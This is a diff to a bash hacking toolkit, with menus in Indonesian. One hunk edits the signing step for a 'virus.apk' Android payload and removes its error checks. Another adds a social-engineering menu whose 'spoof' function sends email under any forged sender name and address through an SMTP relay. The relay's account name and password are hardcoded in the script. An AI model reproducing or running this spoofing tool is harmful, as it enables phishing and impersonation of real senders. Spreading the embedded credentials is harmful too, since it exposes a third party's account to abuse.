@@ -871,22 +871,10 @@ function sign()
  echo "[*] Verifying signed artifacts..."
  
  jarsigner -verify -certs virus.apk > /dev/null 2>&1
- rc=$?
- if [ $rc != 0 ]; then
-   echo "[!] Failed to verify signed artifacts"
-   exit $rc
- fi
- echo "[*] Aligning recompiled APK..."
- 
+
  zipalign 4 virus.apk $apk_name.apk 2>&1
- rc=$?
  echo "[✔] Done."
  
- if [ $rc != 0 ]; then
-   echo "[!] Failed to align recompiled APK"
-   exit $rc
- fi
- rm virus.apk > /dev/null 2>&1
 }
 
 # Menu hacking Android
@@ -1257,6 +1245,88 @@ menu4() {
         x) run ;;
         *) animate "Pilihan tidak valid. Harap coba lagi." ;;
     esac
+}
+
+
+#*****************************************************************************************#
+#                                        Menu 5                                           #
+#*****************************************************************************************#
+
+# Fungsi untuk menu nomor 5
+menu5() {
+    clear
+    animate """
+                          Social Engineering
+    ---------------------------------------------------------------
+    Social engineering adalah teknik manipulasi psikologis yang 
+    digunakan oleh penyerang untuk mendapatkan informasi sensitif 
+    atau melakukan tindakan tertentu dari seseorang.
+    
+    kimak-id
+    ---------------------------------------------------------------
+    Press Enter To Continue
+    """
+    read x
+    clear
+    banner
+
+    animate_menu "Menu Social Engineering"
+    animate """
+
+    [1]. Spoofing Email
+    [2]. Osint - Comming Soon
+    ----------------------------------------------
+    [x]. Kembali
+    ----------------------------------------------
+    """
+    prompt
+
+    case $user_input in
+        1) spoof;;
+        x) run ;;
+        *) animate "Pilihan tidak valid. Harap coba lagi." ;;
+    esac
+}
+
+function spoof(){
+cat <<- EOF
+
+█▀▀ █▀▄▀█ ▄▀█ █ █░░  █▀ █▀█ █▀█ █▀█ █▀▀
+██▄ █░▀░█ █▀█ █ █▄▄  ▄█ █▀▀ █▄█ █▄█ █▀░  
+        
+EOF
+  #statements
+
+echo
+printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Author   : K1M4K-ID\n"
+printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Version  : V1\n" 
+echo
+
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m From Name   : "'\033[32;1m\n')" from
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m From mail   : "'\033[32;1m\n')" email
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Send To     : "'\033[32;1m\n')" to   
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Subject     : "'\033[32;1m\n')" sub 
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Message     : "'\033[32;1m\n\n')" mes
+  echo ""
+  read -p "$(printf " * * * Enter To Send! * * *")" scan
+  sendemail -xu tutorial13456789@gmail.com -xp RWb3Zq8ywS5HnJat -s smtp-relay.brevo.com:587 -f "$from <$email>" -t "$to" -u "$sub" -m "$mes" > /dev/null 2>&1 &&
+  printf "\n\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m successfully sendent!..\n"
+  sleep 2s
+  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m kirim ulang [y/n] : "'\033[34;1m')" scan
+        echo
+        while true
+        do
+                if [ $scan = "y"  ];
+                then
+                spoof
+
+                else [ $scan != "n" ]
+                menu5
+                fi
+        done
+
+
+
 }
 
 
